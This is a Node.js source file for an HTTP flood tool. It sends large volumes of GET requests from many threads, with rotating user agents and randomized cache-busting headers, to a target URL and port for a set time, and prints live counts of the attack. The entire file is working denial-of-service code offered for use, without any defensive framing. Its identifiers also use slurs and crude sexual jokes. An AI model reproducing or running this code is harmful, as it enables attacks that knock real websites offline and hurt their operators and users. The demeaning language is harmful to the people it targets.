"use strict";

/**
 * Custom module dependencies.
 */

const spermAgent = require("sperm-agent");
const retardCLI = require("retard-cli");

/**
 * Module dependencies.
 */

const net = require("net");
const dns = require("dns").promises;
const { URL } = require("url");
const cloudscraper = require("cloudscraper");

/**
 * Diddy class.
 */

class Diddy {
    #url;
    #port;
    #threads;
    #time;
    #useCloudscraper;

    constructor({ url, port, threads, time, useCloudscraper }) {
        this.#url = url;
        this.#port = port;
        this.#threads = threads;
        this.#time = time;
        this.#useCloudscraper = useCloudscraper;
        this.userAgentsCreated = 0;
        this.totalRequests = 0;
        this.failedRequests = 0;
        this.threadsCreated = 0;
        this.socketsCreated = 0;
        this.endTime = 0;
        this.userAgents = [];
        this.break = false;
    }

    #lineFromText(text) {
        const textLength = text.length;
        const line = "═".repeat(textLength);
        return line;
    }


    #centerText(text, line) {
        const padding = Math.max(0, Math.floor((line.length - text.length) / 2));
        return " ".repeat(padding) + text + " ".repeat(padding);
    }

    #display() {
        const text = ` [${this.#url}]: HOST `;
        const line = this.#lineFromText(text);

        console.log(`
         ${this.#centerText(`Farrier's HTTP Method V1`, text)}
        ╔${line}╗
         ${this.#centerText(`[${this.#url}]: HOST`, text)}
          [${this.#port}]: PORT
          [${this.#threads}]: THREADS 
          [${this.#time}]: TIME
          [${this.#useCloudscraper}]: CLOUD_SCRAPE
        ╚${line}╝
         ${this.#centerText(`[${this.totalRequests}]: SENT | [${this.failedRequests}]: FAILED`, text)}
         ${this.#centerText(`[${this.threadsCreated}]: THREADS CREATED`, text)}
         ${this.#centerText(`[${this.socketsCreated}]: SOCKETS`, text)}
         ${this.#centerText(`[${this.userAgentsCreated}]: BIRTH(S)`, text)}
         ${this.#centerText(`[${this.userAgents.length}]: CHILDREN LEFT`, text)}
        `);
    }

    async delay(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }

    async getResolvedIP(hostname) {
        try {
            const { address } = await dns.lookup(hostname);
            return address;
        } catch (err) {
            console.error(`DNS resolution failed for ${hostname}:`, err);
            throw err;
        }
    }

    async sendPackets() {
        const { hostname } = new URL(this.#url);
        const ip = await this.getResolvedIP(hostname);
        this.endTime = Date.now() + this.#time * 1000;
        console.log(`Attack will end at ${new Date(this.endTime).toISOString()}`);

        const incrementGlobalRequests = () => {
            this.totalRequests++;
        };

        const incrementFailedRequests = () => {
            this.failedRequests++;
        };

        const sendInThread = async () => {
            const sock = new net.Socket();
            sock.setKeepAlive(true);
            this.socketsCreated++

            while (!this.break) {
                const userAgent = this.userAgents.shift();

                if (!userAgent) {
                    console.log("No more user agents available.");
                    break;
                }

                try {
                    const packet = this.buildPacket(ip, userAgent);
                    await this.sendDirect(sock, ip, this.#port, packet);

                    incrementGlobalRequests();
                } catch (err) {
                    incrementFailedRequests();
                }

                await this.delay(0);
            }

            --this.socketsCreated
            sock.destroy();
        };

        console.log(`Sending packets to ${ip}:${this.#port}...`);

        const checkEndTime = async () => {
            while (Date.now() <= this.endTime) {
                console.clear();
                this.#display();

                if (this.userAgents.length <= 50) {
                    const mother = new spermAgent();
                    const newAgents = mother.birth(this.#threads * this.#time);
                    this.userAgents.push(...newAgents);
                    this.userAgentsCreated += (this.#threads * this.#time);
                }

                await this.delay(10);
            }
            
            this.break = true;
        };

        const threadPromises = [];
        for (let i = 0; i < this.#threads; i++) {
            threadPromises.push(sendInThread(this.break).catch(err => console.error(`Thread error: ${err.message}`)));
            this.threadsCreated++;
        }

        await Promise.all([Promise.all(threadPromises), checkEndTime()]);
        
        console.log(`Total successful requests: ${this.totalRequests}`);
        console.log(`Total failed requests: ${this.failedRequests}`);
        console.log(`Attack completed at ${new Date().toISOString()}`);
    }

    buildPacket(hostname, userAgent) {
        const randsemilla = Array.from(
            { length: 30 },
            () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]
        ).join("");

        return `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: Keep-Alive\r\n\r\n`;
    }

    async sendDirect(sock, ip, port, packet, retries = 0) {
        return new Promise((resolve, reject) => {
            sock.connect(port, ip, () => {
                sock.write(packet, (err) => {
                    if (err) {
                        sock.destroy();
                        reject(err);
                    } else {
                        resolve(true);
                    }
                });
            });

            sock.on("error", (err) => {
                sock.destroy();
                reject(err);
            });
        });
    }

    async #start() {
        const mother = new spermAgent();
        this.userAgents = mother.birth(this.#threads * this.#time);
        this.userAgentsCreated += (this.#threads * this.#time);
        
        await this.sendPackets();
    }

    molest() {
        this.#display();
        this.#start();
    }
}

/**
 * Start the Diddy Party.
 */

new retardCLI().new(
    {
        url: { reply: "Invalid URL", type: "string" },
        port: { reply: "Invalid PORT", type: "number" },
        threads: { reply: "Invalid THREAD", type: "number" },
        time: { reply: "Invalid TIME", type: "number" },
        useCloudscraper: { reply: "Invalid useCloudscraper", type: "boolean" },
    },
    function (success, args) {
        if (!success) process.exit(1);

        const { url, port, threads, time, useCloudscraper } = args;
        const diddy = new Diddy({
            url: url,
            port: port,
            threads: threads,
            time: time,
            useCloudscraper: useCloudscraper,
        });

        diddy.molest();
    },
    true
);
